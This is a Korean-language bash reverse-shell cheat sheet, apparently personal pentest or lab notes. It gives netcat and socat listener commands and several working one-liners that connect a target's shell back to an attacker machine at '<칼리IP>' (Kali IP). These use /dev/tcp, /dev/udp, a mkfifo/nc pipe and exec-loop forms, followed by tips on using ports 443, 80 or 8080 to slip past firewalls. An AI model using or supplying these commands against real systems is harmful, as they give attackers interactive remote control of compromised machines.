# bash

# 리버스쉘 — Bash

---

## 리스너 (항상 먼저)

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444     # 화살표/히스토리 지원
socat file:`tty`,raw,echo=0 tcp-listen:4444   # 즉시 TTY
```

---

## 기본

```bash
bash -i >& /dev/tcp/<칼리IP>/4444 0>&1
```

---

## /dev/tcp 미지원 환경

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <칼리IP> 4444 > /tmp/f
```

---

## sh 버전

```bash
sh -i >& /dev/tcp/<칼리IP>/4444 0>&1
0<&196;exec 196<>/dev/tcp/<칼리IP>/4444; sh <&196 >&196 2>&196
```

---

## UDP 버전

```bash
sh -i >& /dev/udp/<칼리IP>/4444 0>&1
# 리스너: nc -u -lvnp 4444
```

---

## exec 형태

```bash
exec 5<>/dev/tcp/<칼리IP>/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
```

---

## 팁

- `/bin/bash`가 없으면 `/bin/sh` 로 대체
- `bash -i` 가 안 되면 `bash -c` 로 시도
- 환경에 따라 포트 443, 80, 8080이 방화벽 우회에 유리